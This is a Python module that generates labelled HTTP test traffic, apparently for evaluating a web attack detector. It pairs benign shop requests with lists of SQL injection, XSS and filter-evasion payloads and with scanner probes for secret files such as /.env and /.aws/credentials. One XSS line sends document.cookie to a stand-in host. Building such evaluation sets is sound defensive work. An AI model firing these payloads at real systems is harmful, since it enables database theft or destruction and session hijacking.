"""Labelled test traffic for the evaluation. It is separate from the ML training data.

Normal requests use their own seed, and attacks were written separately from the unit-test
payloads. "abnormal" requests contain no attack keywords, to measure what ML adds.
"""
from __future__ import annotations

import random
import string
from dataclasses import dataclass, field
from urllib.parse import quote, urlencode

BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
SEED = 777


@dataclass(frozen=True)
class Sample:
    category: str  # normal | sqli | xss | evasion | abnormal
    method: str
    path: str
    query: str = ""
    body: bytes = b""
    headers: dict[str, str] = field(default_factory=dict)
    requests_last_minute: int = 5
    unique_paths_last_minute: int = 3
    error_ratio_last_minute: float = 0.0

    @property
    def is_attack(self) -> bool:
        return self.category != "normal"


SQLI_VALUES = [
    "x' OR 'a'='a", "1' or '1'='1' -- -", "\" or \"\"=\"", "') OR ('x'='x", "1 or 2=2", "admin' #",
    "' UNION SELECT NULL--", "0 UNION SELECT table_name FROM information_schema.tables",
    "-1 UNION ALL SELECT 1,@@version,3", "1' UNION SELECT card, cvv FROM payments-- ",
    "1; UPDATE users SET role='admin' WHERE id=1", "2; DROP DATABASE shop", "'; TRUNCATE TABLE logs; --",
    "1'; INSERT INTO users VALUES ('x','y'); --", "1 AND BENCHMARK(5000000,MD5(1))", "1); SELECT pg_sleep(10)--",
    "' AND SLEEP(3) AND '1'='1", "1' WAITFOR DELAY '0:0:10'--", "1 AND 1=CONVERT(int,(SELECT @@version))",
    "' AND updatexml(1,concat(0x7e,(SELECT user())),1)--", "' OR EXISTS(SELECT * FROM users)--",
    "1 GROUP BY 5--", "1' ORDER BY 3#", "' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
    "'; COPY users TO PROGRAM 'id'; --", "1 AND LOAD_FILE('/etc/passwd')", "' INTO OUTFILE '/tmp/x.php'--",
    "' HAVING 1=1--", "1 RLIKE (SELECT 1)", "1 AND ASCII(SUBSTRING((SELECT password FROM users),1,1))>64",
]

XSS_VALUES = [
    "<script>fetch('//evil.example/'+document.cookie)</script>", "<script src=https://evil.example/a.js></script>",
    "<img src=1 onerror=confirm(1)>", "<IMG SRC=x onError=prompt(1)>", "<svg/onload=alert(1)>",
    "<body onpageshow=alert(1)>", "<input autofocus onfocus=alert(1)>", "<select onfocus=alert(1) autofocus>",
    "<video><source onerror=alert(1)></video>", "<audio src=x onerror=alert(1)>", "<details ontoggle=alert(1) open>",
    "<marquee onstart=alert(1)>", "<div onmouseover=alert(1)>x</div>", "<a href=javascript:alert(1)>x</a>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>", "<iframe src=//evil.example></iframe>",
    "<object data=javascript:alert(1)>", "<embed src=//evil.example/x.swf>", "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>", "\" autofocus onfocus=alert(1) x=\"", "javascript:void(document.cookie)",
    "<svg><script>alert(1)</script></svg>", "<math><mtext></mtext><script>alert(1)</script></math>",
    "<form action=javascript:alert(1)><button>x</button></form>", "<link rel=stylesheet href=javascript:alert(1)>",
    "<base href=//evil.example/>", "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
    "<style>@import 'https://evil.example/x.css';</style>", "<x onclick=alert(1)>click</x>",
    "${alert(1)}", "<a href='data:text/html,<script>alert(1)</script>'>x</a>",
]

EVASION_VALUES = [
    quote("' OR '1'='1"), quote(quote("' UNION SELECT 1,2--")), quote(quote(quote("<script>alert(1)</script>"))),
    "%3Csvg%20onload%3Dalert(1)%3E", "1 uNiOn/*x*/sElEcT 1,2", "1/*!50000UNION*//*!50000SELECT*/1,2",
    "1 UNION/**/ALL/**/SELECT/**/1", "1%0aUNION%0aSELECT%0a1", "1%09or%091=1", "'/**/OR/**/'1'='1", "'||'1'='1",
    "' OR 1=1%00", "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", "&lt;img src=x onerror=alert(1)&gt;",
    "\\u003csvg onload=alert(1)\\u003e", "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e", "<scr\tipt>alert(1)</scr\tipt>",
    "<img src=x o\nnerror=alert(1)>", "jav​ascript:alert(1)", "＜script＞alert(1)＜/script＞",
    "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "J1VOSU9OIFNFTEVDVCAxLDIgLS0=", "1' oR 0x31=0x31--", "1 || 1=1",
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>", "%u003Cscript%u003Ealert(1)%u003C/script%u003E",
]


def _attack(category: str, value: str, rng: random.Random) -> Sample:
    choice = rng.random()
    agent = {"user-agent": BROWSER, "accept": "text/html"}
    if choice < 0.6:
        # Query is kept raw when already encoded, so encoding evasions stay intact.
        encoded = value if category == "evasion" and "%" in value else quote(value, safe="")
        return Sample(category, "GET", "/products", f"q={encoded}", headers=agent)
    if choice < 0.85:
        body = urlencode({"name": "Sara", "message": value}).encode()
        return Sample(category, "POST", "/contact", body=body,
                      headers={**agent, "content-type": "application/x-www-form-urlencoded"})
    body = ('{"productId": 1, "note": ' + _json_quote(value) + "}").encode()
    return Sample(category, "POST", "/api/orders", body=body, headers={**agent, "content-type": "application/json"})


def _json_quote(value: str) -> str:
    import json

    return json.dumps(value)


def _noise(rng: random.Random, length: int) -> str:
    return "".join(rng.choices(string.ascii_letters + string.digits, k=length))


def abnormal_samples(rng: random.Random) -> list[Sample]:
    """Scanners, floods, huge random values: suspicious, without any attack keywords."""
    samples: list[Sample] = []
    scanner_paths = ["/.env", "/.git/config", "/wp-admin/setup-config.php", "/phpmyadmin/index.php", "/server-status",
                     "/backup.tar.gz", "/config.yml", "/actuator/env", "/.aws/credentials", "/vendor/phpunit/x.php"]
    for path in scanner_paths:
        samples.append(Sample("abnormal", "GET", path, headers={"user-agent": "x"}, requests_last_minute=240,
                              unique_paths_last_minute=230, error_ratio_last_minute=0.95))
    for _ in range(15):
        samples.append(Sample("abnormal", "GET", "/api/products", "blob=" + _noise(rng, rng.randint(600, 3000)),
                              headers={"user-agent": "x"}, requests_last_minute=rng.randint(100, 280),
                              unique_paths_last_minute=rng.randint(1, 5), error_ratio_last_minute=rng.uniform(0.3, 1)))
    for _ in range(10):
        params = {f"k{i}": str(rng.randint(0, 9999)) for i in range(rng.randint(30, 80))}
        samples.append(Sample("abnormal", "GET", "/api/products", urlencode(params), headers={"accept": "*/*"},
                              requests_last_minute=rng.randint(30, 200)))
    for _ in range(10):
        body = _noise(rng, rng.randint(4000, 12000)).encode()
        samples.append(Sample("abnormal", rng.choice(["POST", "PUT"]), "/api/orders", body=body,
                              headers={"user-agent": "python-requests/2.32", "content-type": "application/json"},
                              requests_last_minute=rng.randint(60, 250), error_ratio_last_minute=rng.uniform(0.4, 1)))
    for _ in range(10):
        deep = "/".join(_noise(rng, 6) for _ in range(rng.randint(15, 40)))
        samples.append(Sample("abnormal", "GET", f"/{deep}", headers={"user-agent": "curl/8.9.1"},
                              requests_last_minute=rng.randint(50, 250), unique_paths_last_minute=rng.randint(50, 200),
                              error_ratio_last_minute=rng.uniform(0.5, 1)))
    return samples


NORMAL_TEXT = [
    "best laptop for students", "O'Reilly security book", "Tom's shoes", "rock & roll", "C++ primer", "2 > 1",
    "how to learn SQL", "select a gift for dad", "update my order please", "where is my order?", "50% discount",
    "price: $20", "He said \"hello\"", "script writing course", "alert system for home", "union bank islamabad",
    "drop shipping guide", "Is this sold-out?", "email me at sara@example.com", "#1 product", "a/b testing book",
    "javascript for beginners", "html tags list", "café au lait", "صفحہ", "日本語の本", "iPhone 15 (256GB)",
    "don't ship to my old address", "order by phone", "from your shop", "It's 5 o'clock",
]


def normal_samples(rng: random.Random, count: int) -> list[Sample]:
    browser = {"user-agent": BROWSER, "accept": "text/html,application/xhtml+xml", "accept-language": "en-US,en;q=0.9",
               "accept-encoding": "gzip, deflate, br", "cache-control": "no-cache", "sec-fetch-mode": "navigate",
               "sec-fetch-site": "same-origin", "host": "site.example", "connection": "keep-alive"}
    samples: list[Sample] = []
    for _ in range(count):
        roll = rng.random()
        rate = max(1, int(rng.lognormvariate(2.4, 0.8)))
        extra = {"requests_last_minute": min(rate, 100), "unique_paths_last_minute": max(1, rate // 2)}
        if roll < 0.3:
            path = rng.choice(["/", "/products", "/contact", "/about", "/products/2", "/products/5"])
            samples.append(Sample("normal", "GET", path, headers=browser, **extra))
        elif roll < 0.55:
            query = urlencode({"q": rng.choice(NORMAL_TEXT)})
            samples.append(Sample("normal", "GET", "/products", query, headers=browser, **extra))
        elif roll < 0.8:
            digest = _noise(rng, 16).lower()
            samples.append(Sample("normal", "GET", f"/_next/static/chunks/{rng.randint(100, 999)}-{digest}.js",
                                  headers=browser, **extra))
        elif roll < 0.9:
            body = urlencode({"name": rng.choice(["Sara", "O'Brien", "Ali"]), "message": rng.choice(NORMAL_TEXT)}).encode()
            samples.append(Sample("normal", "POST", "/contact", body=body,
                                  headers={**browser, "content-type": "application/x-www-form-urlencoded"}, **extra))
        else:
            body = f'{{"productId": {rng.randint(1, 5)}, "quantity": {rng.randint(1, 4)}}}'.encode()
            samples.append(Sample("normal", "POST", "/api/orders", body=body,
                                  headers={**browser, "content-type": "application/json"}, **extra))
    return samples


def build_dataset(normal_count: int = 1000) -> list[Sample]:
    rng = random.Random(SEED)
    samples = normal_samples(rng, normal_count)
    samples += [_attack("sqli", v, rng) for v in SQLI_VALUES]
    samples += [_attack("xss", v, rng) for v in XSS_VALUES]
    samples += [_attack("evasion", v, rng) for v in EVASION_VALUES]
    samples += abnormal_samples(rng)
    return samples
